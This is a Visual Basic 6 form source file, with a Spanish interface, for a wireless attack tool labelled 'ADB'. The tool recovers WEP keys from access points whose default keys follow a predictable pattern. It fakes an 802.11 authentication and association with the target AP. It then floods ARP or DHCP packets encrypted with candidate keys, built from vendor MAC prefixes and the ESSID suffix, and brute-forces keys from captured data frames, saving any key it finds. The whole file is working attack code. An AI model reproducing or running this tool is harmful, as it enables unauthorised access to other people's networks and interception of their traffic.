VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frm_assoc 
   BackColor       =   &H00FFFFFF&
   Caption         =   "ADB"
   ClientHeight    =   6120
   ClientLeft      =   5655
   ClientTop       =   3720
   ClientWidth     =   6450
   Icon            =   "frm_assoc.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   6120
   ScaleWidth      =   6450
   Begin VB.CommandButton pb_detener 
      Caption         =   "Detener ataque"
      Enabled         =   0   'False
      Height          =   255
      Left            =   4320
      TabIndex        =   16
      Top             =   5760
      Width           =   2055
   End
   Begin VB.OptionButton opt_tipo 
      BackColor       =   &H00FFFFFF&
      Caption         =   "DHCP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800080&
      Height          =   255
      Index           =   1
      Left            =   2760
      TabIndex        =   15
      Top             =   1680
      Width           =   975
   End
   Begin VB.OptionButton opt_tipo 
      BackColor       =   &H00FFFFFF&
      Caption         =   "ARP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800080&
      Height          =   255
      Index           =   0
      Left            =   1920
      TabIndex        =   14
      Top             =   1680
      Value           =   -1  'True
      Width           =   855
   End
   Begin VB.CommandButton pb_adb 
      Caption         =   "ADB!"
      Enabled         =   0   'False
      Height          =   255
      Left            =   3840
      TabIndex        =   13
      Top             =   1680
      Width           =   1215
   End
   Begin VB.ListBox lst_pak 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3630
      Left            =   120
      TabIndex        =   9
      Top             =   2040
      Width           =   6135
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Asociar"
      Enabled         =   0   'False
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   1680
      Width           =   1215
   End
   Begin MSWinsockLib.Winsock ws01 
      Left            =   7920
      Top             =   6000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label l_cp 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      Caption         =   "0000"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   20.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00800080&
      Height          =   375
      Left            =   5160
      TabIndex        =   12
      Top             =   1560
      Width           =   1095
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "Progreso:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   5
      Left            =   120
      TabIndex        =   11
      Top             =   1260
      Width           =   975
   End
   Begin VB.Shape Shape3 
      Height          =   255
      Left            =   1200
      Top             =   1200
      Width           =   5055
   End
   Begin VB.Shape sh_progreso 
      BackColor       =   &H000040C0&
      BackStyle       =   1  'Opaque
      Height          =   135
      Left            =   1200
      Top             =   1260
      Width           =   5055
   End
   Begin VB.Shape sh_senal 
      BackColor       =   &H00FF0000&
      BackStyle       =   1  'Opaque
      Height          =   135
      Left            =   1200
      Top             =   840
      Width           =   5055
   End
   Begin VB.Shape Shape1 
      Height          =   255
      Left            =   1200
      Top             =   780
      Width           =   5055
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "Señal:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   3
      Left            =   120
      TabIndex        =   10
      Top             =   840
      Width           =   975
   End
   Begin VB.Shape sh01 
      BackColor       =   &H00008000&
      BackStyle       =   1  'Opaque
      Height          =   255
      Left            =   1440
      Top             =   1680
      Width           =   255
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Canal:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   1
      Left            =   3480
      TabIndex        =   8
      Top             =   480
      Width           =   615
   End
   Begin VB.Label l_canal 
      BackColor       =   &H00FFFFFF&
      Caption         =   "XX"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   4080
      TabIndex        =   7
      Top             =   480
      Width           =   375
   End
   Begin VB.Label l_essid 
      BackColor       =   &H00FFFFFF&
      Caption         =   "WLAN_XX"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   5280
      TabIndex        =   5
      Top             =   480
      Width           =   1095
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FFFFFF&
      Caption         =   "ESSID:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   4
      Left            =   4560
      TabIndex        =   4
      Top             =   480
      Width           =   735
   End
   Begin VB.Label l_bssid 
      BackColor       =   &H00FFFFFF&
      Caption         =   "00:00:00:00:00:00"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   1200
      TabIndex        =   3
      Top             =   480
      Width           =   2175
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "BSSID:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   2
      Left            =   120
      TabIndex        =   2
      Top             =   480
      Width           =   975
   End
   Begin VB.Label l_macl 
      BackColor       =   &H00FFFFFF&
      Caption         =   "00:00:00:00:00:00"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Left            =   1200
      TabIndex        =   1
      Top             =   120
      Width           =   2175
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      BackColor       =   &H00FFFFFF&
      Caption         =   "MAC Local:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H007A4075&
      Height          =   255
      Index           =   0
      Left            =   0
      TabIndex        =   0
      Top             =   120
      Width           =   1095
   End
End
Attribute VB_Name = "frm_assoc"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim bssid As String
Dim ESSID As String
Dim lMAC As String
Dim Canal As Integer
Dim WBeacon As Boolean
Dim dBeacon As String
Dim dChallenge As String
Dim dAnswer As String
Dim dAssoc As String
Dim Buscando As Boolean
Dim ClaveEnc As String
Dim CurClave As String
Dim BalizaGuardada As Boolean
Dim NoProcesar As Boolean
Const maxw = 5055
Dim activada As Boolean
Private Sub MarcaSenal(ByVal senal As Integer)
      sh_senal.Width = senal / 100 * maxw
      sh_senal.Refresh
End Sub
Private Sub Log(ByVal msg As String)
  lst_pak.AddItem msg
  If lst_pak.ListCount > 12 Then
     lst_pak.TopIndex = lst_pak.ListCount - 12
  End If
  lst_pak.Refresh
End Sub

Private Function ADB_MX(ByVal sessid As String, ByVal sbssid As String, ByVal ataque As String) As String
    Dim BootPC As String
    Dim clave As String
    Dim C1 As String
    Dim C2 As String
    Dim C3 As String
    Dim C4 As String
    Dim C5 As String
    Dim V1 As Integer
    Dim n As Integer
    Dim T As Long
    Dim ct As Long
    Dim i As Integer
    Dim sg As Boolean
    Dim noval As Integer
    Select Case Left$(sbssid, 8)
        Case "00:01:38"
             C1 = "X000138"
        Case "00:16:38"
             C1 = "C0030DA"
        Case "00:02:CF"
             C1 = "Z001349"
        Case "00:13:49"
             C1 = "Z001349"
    End Select
    C5 = Right$(sessid, 2)
    V1 = HexDec(Mid$(sbssid, 10, 2))
    Buscando = True
    ClaveEnc = ""

    Do
        If Not sg Then
           m = V1 + i
        Else
           i = i + 1
           m = V1 - i
        End If
        If m < 0 Or m > 255 Then
           noval = noval + 1
           If noval = 2 Then Exit Do
        Else
           noval = 0
           C3 = DecHex(m)
           For n = 0 To 255
               If Not Buscando Then Exit For
               C4 = DecHex(n)
               clave = C1 & C2 & C3 & C4 & C5
               CurClave = clave
               l_cp.Caption = C3 & C4
               l_cp.Refresh
               If ataque = "DHCP" Then
                  BootPC = CreaBootPC(False, l_macl.Caption, l_bssid.Caption, clave)
                  Espera 1
               Else
                  BootPC = CreaARPRequest802(l_bssid.Caption, l_macl.Caption, "FF:FF:FF:FF:FF:FF", "192.168.1.100", "192.168.1.1", clave)
                  Espera 1
               End If
               
               SendPacket BootPC
               ct = ct + 1
               Progreso (ct * 100) / 65535
               'Debug.Print "---->" & clave
           Next n
        End If
        If Not Buscando Then Exit Do
        sg = Not sg
    Loop
    If Buscando Then
       Debug.Print "esperando...."
       T = GetTickCount()
       Do While (GetTickCount() - T) < 30000 And Buscando = True
          DoEvents
       Loop
    End If
    If ClaveEnc > "" Then
       ADB_MX = C1 & Right$(ClaveEnc, 6)
    Else
       ADB_MX = "No encontrada"
    End If
End Function
Private Sub Progreso(ByVal pct As Integer)
   Dim d As Double
   d = pct / 100
   sh_progreso.Width = maxw * d
   sh_progreso.Refresh
End Sub




Private Sub Command2_Click()
    sh01.BackColor = Naranja
    
    If FakeAssoc2(bssid, ESSID, lMAC) Then
       sh01.BackColor = Verde
       pb_adb.Enabled = True
       
    Else
       sh01.BackColor = Rojo
       pb_adb.Enabled = False
    End If
End Sub

Private Sub Form_Load()
   Dim T As Long
   sh01.BackColor = Rojo
   ws01.RemoteHost = "127.0.0.1"
   ws01.RemotePort = 666
   ws01.Connect
   T = GetTickCount()
   Do While ((GetTickCount() - T) < 3000) And ws01.State <> 7
      DoEvents
   Loop
   If ws01.State <> 7 Then
      MsgBox "No se ha podido conectar"
   End If
   l_essid.Caption = gESSID
   l_bssid.Caption = gBSSID
   l_canal.Caption = Format$(gCANAL, "00")
   l_macl.Caption = gMACLocal
   Progreso 0
   MarcaSenal 0
   AbrirCAP "ADB_" & gESSID & "_" & Format$(Now, "yyyymmddhhmmss")

End Sub

Private Sub l_bssid_Change()
   bssid = HexaASCII(Replace(l_bssid.Caption, ":", ""))
End Sub

Private Sub l_essid_Change()
   ESSID = l_essid.Caption
End Sub

Private Sub l_macl_Change()
   lMAC = HexaASCII(Replace(l_macl.Caption, ":", ""))
End Sub


Private Sub pb_envio_Click()
    On Error Resume Next
    frm_envio.Show vbModal
End Sub

Private Sub pb_adb_Click()
   Screen.MousePointer = 11
      pb_adb.Enabled = False
      pb_detener.Enabled = True
      Debug.Print ADB_MX(gESSID, gBSSID, IIf(opt_tipo(0).Value = True, "ARP", "DHCP"))
      pb_adb.Enabled = True
      pb_detener.Enabled = False
   Screen.MousePointer = 0
End Sub

Private Sub pb_detener_Click()
   Buscando = False
End Sub

Private Sub ws01_DataArrival(ByVal bytesTotal As Long)
   Dim a As String
   ws01.GetData a
   Procesa a
End Sub

Private Sub Procesa(ByVal a As String)
   Dim n As Long
   Dim P As String
   Static b As String
   Dim header As String
   Dim Payload As String
   Dim lpayload As Long
   b = b & a
   Do
       header = Left$(b, 5)
       If Len(header) < 5 Then Exit Do
       lpayload = Asc(Mid$(b, 5, 1)) + (256 * Asc(Mid$(b, 4, 1)))
       Payload = Mid$(b, 6, lpayload)
       b = Mid$(b, lpayload + 5 + 1)
               
       ProcesaPaquete header, Payload
       
       DoEvents
   Loop
End Sub
Private Sub ProcesaPaquete(ByVal HDR As String, ByVal PLD As String)
   Static np As Long
   Dim pwr As Integer
   Dim frmctr As TPE_FrameControl
   Dim pckdMAC As String
   Dim pcksMAC As String
   Dim pckBSSID As String

   If NoProcesar Then Exit Sub
   np = np + 1
   pwr = Asc(Left$(PLD, 1))
   Select Case Asc(Left$(HDR, 1))
      Case 7 'Respuesta a petición de MAC Local
         l_macl = ASCIIHexa2(PLD)
         Command2.Enabled = True
      Case 5 'Paquete
         PLD = Mid$(PLD, 29)
         SetFrameControl Left$(PLD, 2), frmctr
         If frmctr.ToDS = False And frmctr.FromDS = False Then
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = False And frmctr.FromDS = True Then
            pckdMAC = Mid$(PLD, 5, 6)
            pckBSSID = Mid$(PLD, 11, 6)
            pcksMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = False Then
            pckBSSID = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckdMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = True Then 'No sabemos como asignar, asi que dejamos como caso primero
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
         End If
         
         If pckBSSID = bssid And (pckdMAC = lMAC Or pckdMAC = HexaASCII("FFFFFFFFFFFF")) Then
             Select Case frmctr.Type
                    Case PCK_TYPE.Management
                         If Not BalizaGuardada Then
                            EscribeCAP PLD
                            BalizaGuardada = True
                         Else
                            If frmctr.Subtype <> PCK_SUBTYPE.mgmt_Beacon Then
                               EscribeCAP PLD
                            End If
                         End If
                         Select Case frmctr.Subtype
                                Case PCK_SUBTYPE.mgmt_Beacon         'BALIZA
                                     dBeacon = PLD
                                     MarcaSenal pwr
                                     Command2.Enabled = True
                                Case PCK_SUBTYPE.mgmt_AssocResponse  'ASOCIACION
                                        dAssoc = PLD
                                        Log "<-- Recibido paquete asociacion"
                                Case PCK_SUBTYPE.mgmt_Authentication 'CHALLENGE
                                     If Asc(Mid$(PLD, 27, 1)) = 2 Then
                                        dChallenge = PLD
                                        Log "<-- Recibido paquete authentication"
                                     End If
                                
                                Case PCK_SUBTYPE.mgmt_AssocRequest
                                        Log "<-- Recibido paquete mgmt_AssocRequest: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ATIM
                                        Log "<-- Recibido paquete mgmt_ATIM: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_Deauthentication
                                        Log "<-- Recibido paquete mgmt_Deauthentication: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_Disassociation
                                        Log "<-- Recibido paquete mgmt_Disassociation: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ProbeRequest
                                        Log "<-- Recibido paquete mgmt_ProbeRequest: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ProbeResponse
                                        Log "<-- Recibido paquete mgmt_ProbeResponse: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ReAssocRequest
                                        Log "<-- Recibido paquete mgmt_ReAssocRequest: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.mgmt_ReAssocResponse
                                        Log "<-- Recibido paquete mgmt_ReAssocResponse: " & ASCIIHexa(pckdMAC)
                         
                         End Select
                    
                    Case PCK_TYPE.data
                         sendACK
                         EscribeCAP PLD
                         If DecHex(Asc(Mid$(PLD, 22, 1))) = Right$(gESSID, 2) Then
                            Buscando = False
                            ClaveEnc = clave(MAC(Mid$(PLD, 17, 6)))
                            Log "(i) Posible clave extraida. Probando clave... "
                            If ClaveValida(Mid$(PLD, 25), ClaveEnc) = True Then
                               EscribeClave MAC(pckBSSID), ClaveEnc
                               EscribeWEP MAC(pckBSSID), ClaveEnc
                               Log "(^) La clave wep " & ClaveEnc & " es valida."
                               Log "(^) CLAVE WEP ENCONTRADA"
                               l_cp.Caption = "XXXX"
                               'pb_envio.Enabled = True
                               NoProcesar = True
                            Else
                               Log "(!) La clave wep no es valida"
                            End If
                         End If
                         Select Case frmctr.Subtype
                                Case PCK_SUBTYPE.data_NullData
                                     Log "<-- Recibido paquete NullData: " & ASCIIHexa(pckdMAC)
                                Case PCK_SUBTYPE.data_Data
                                     Log "<-- Recibido paquete Data: " & ASCIIHexa(pckdMAC)
                                Case Else
                                     Log "<-- Recibido paquete de datos subtype " & frmctr.Subtype
                         End Select
    '                Case PCK_TYPE.Control
                
             End Select
          
          ElseIf pckBSSID = bssid And frmctr.Type = PCK_TYPE.data And frmctr.Subtype = PCK_SUBTYPE.data_Data Then
                 Log "<-- Recibido paquete de datos para otra estación"
                 Log "--->Aplicando fuerza bruta a paquete"
                 clavefb = GuessClave(Mid$(PLD, 25), clave2(MAC(bssid), ESSID))
                 If clavefb > "" Then
                    Buscando = False
                    EscribeClave MAC(pckBSSID), clavefb
                    EscribeWEP MAC(pckBSSID), clavefb
                    Log "(^) La clave wep " & clavefb & " es valida."
                    Log "(^) CLAVE WEP ENCONTRADA"
                    l_cp.Caption = "XXXX"
                    NoProcesar = True
                 End If
          End If
             
       End Select
End Sub
Private Function WaitForBeacon(ByVal bssid As String, ByVal TOut As Long) As String
   Dim T As Long
   dBeacon = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dBeacon > "" Then 'Ha llegado una baliza
          If Mid$(dBeacon, 11, 6) = bssid Or bssid = "" Then 'Ha llegado una baliza del BSSID o vale cualquiera
             WaitForBeacon = Mid$(dBeacon, 35, 2)
             Exit Function
          End If
       End If
       DoEvents
   Loop
End Function
Private Function WaitChallenge(ByVal TOut As Long) As String
   Dim T As Long
   dChallenge = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dChallenge > "" Then 'Ha llegado un challenge
          If Mid$(dChallenge, 5, 6) = lMAC And Mid$(dChallenge, 11, 6) = bssid Then
             WaitChallenge = dChallenge
             Exit Function
          End If
       End If
       DoEvents
   Loop
End Function
Private Function WaitAssoc(ByVal TOut As Long) As String
   Dim T As Long
   dAssoc = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dAssoc > "" Then 'Ha llegado un Assoc
             WaitAssoc = dAssoc
             Exit Function
       End If
       DoEvents
   Loop
End Function

Private Function WaitAnswer(ByVal Answer As String, ByVal TOut As Long) As String
   Dim T As Long
   dAnswer = ""
   T = GetTickCount()
   Do
       If (GetTickCount() - T) > TOut Then Exit Do
       If dAnswer > "" Then 'Ha llegado una respuesta
             If dAnswer = Answer Then
                Exit Function
             End If
       End If
       DoEvents
   Loop
End Function
Private Sub sendACK()
   Dim ack As String
   ack = HexaASCII("D400000000000000000000000000")
   Mid$(ack, 5, 6) = gBSSID
   SendPacket ack
End Sub

Private Function FakeAssoc2(ByVal bssid As String, ByVal ESSID As String, ByVal MAC As String) As Boolean
   Dim Assoc As String
   Dim Rates As String
   Dim ack As String
   Dim Auth1 As String
   Dim Capa As String
   Dim n As Integer
   Dim salir As Boolean
   Dim sl As Integer

   Rates = HexaASCII("010402040B1632080C1218243048606C")
   Assoc = HexaASCII("00003A01000000000000000000000000000000000000C00031046400")
   Auth1 = HexaASCII("B0003A010000000000000000000000000000000000000000000001000000")

   Mid$(Auth1, 5, 6) = bssid
   Mid$(Auth1, 11, 6) = MAC
   Mid$(Auth1, 17, 6) = bssid
   
   Mid$(Assoc, 5, 6) = bssid
   Mid$(Assoc, 11, 6) = MAC
   Mid$(Assoc, 17, 6) = bssid
   Assoc = Assoc & Chr$(0) & Chr$(Len(ESSID)) 'Añadimos a Assoc la longitud de essid
   Assoc = Assoc & ESSID
   Assoc = Assoc & Rates
   
   dChallenge = ""
   
   Log "(i) Esperando baliza de " & ASCIIHexa2(bssid)
   Capa = WaitForBeacon(bssid, 10000)
   If Capa = "" Then
      Log "(!) No se ha recibido baliza del AP"
      Exit Function
   End If
   Command2.Enabled = True
   Log "(i) Baliza recibida"
   
   Mid$(Assoc, 25, 2) = Capa
   
   SendPacket Auth1
   Log "--> Paquete autenticación enviado"
  
   WaitAnswer HexaASCII("0000001E"), 200
   salir = False
   
   sendACK
   WaitAnswer HexaASCII("0000000E"), 200
   
   If dChallenge = "" Then
      WaitChallenge 10000
   End If
   If dChallenge = "" Then
      Log "(!) El AP no ha autenticado la estación."
      Exit Function
   End If
   
   dAssoc = ""
   SendPacket Assoc
   Log "--> Paquete asociación enviado"
   
   sendACK
   WaitAnswer HexaASCII("0000000E"), 200
   
   If dAssoc = "" Then
      WaitAssoc 10000
   End If
   
   If dAssoc > "" Then
      FakeAssoc2 = True
      Exit Function
   Else
      Log "(!) El AP no ha asociado la estación"
   End If
    
End Function


Private Sub SendPacket(ByVal Pck As String)
   Dim P As String
   Dim l As Long
   Dim b1 As Byte
   Dim b2 As Byte
   Pck = HexaASCII("00000000") & Pck
   l = Len(Pck)
   b1 = l \ 256
   b2 = l Mod 256
   
   P = HexaASCII("040000")
   P = P & Chr$(b1) & Chr$(b2)
   P = P & Pck
   ws01.SendData P
End Sub
